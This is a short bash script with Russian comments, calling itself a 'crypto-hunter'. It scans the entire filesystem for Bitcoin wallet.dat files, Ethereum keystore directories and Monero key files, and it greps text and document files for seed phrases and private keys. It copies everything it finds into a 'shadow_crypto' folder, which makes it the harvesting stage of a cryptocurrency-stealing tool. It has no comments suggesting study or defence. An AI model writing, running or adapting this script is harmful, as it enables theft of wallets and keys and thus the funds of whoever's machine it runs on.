#!/bin/bash
# Крипто-охотник — поиск кошельков и ключей
OUT="$HOME/shadow_crypto_$(date +%H%M)"
mkdir -p "$OUT"

echo "[CRYPTO] Ищу криптовалюту..."

# Bitcoin
find / -name "wallet.dat" 2>/dev/null | while read f; do
    cp "$f" "$OUT/bitcoin_wallet.dat" 2>/dev/null
    echo "  ₿ Bitcoin: $f"
done

# Ethereum
find / -name "keystore" -type d 2>/dev/null | while read d; do
    cp -r "$d" "$OUT/ethereum_keystore" 2>/dev/null
    echo "  ⟠ Ethereum: $d"
done

# Monero
find / -name "*.keys" -path "*monero*" 2>/dev/null | while read f; do
    cp "$f" "$OUT/" 2>/dev/null
    echo "  ɱ Monero: $f"
done

# Сид-фразы в текстовых файлах
find / -name "*.txt" -o -name "*.md" -o -name "*.doc" 2>/dev/null | head -50 | while read f; do
    grep -qil "seed\|mnemonic\|recovery phrase\|private key" "$f" 2>/dev/null && {
        cp "$f" "$OUT/" 2>/dev/null
        echo "  🌱 Seed phrase: $f"
    }
done

echo "[CRYPTO] Найдено: $(ls "$OUT" | wc -l) артефактов"
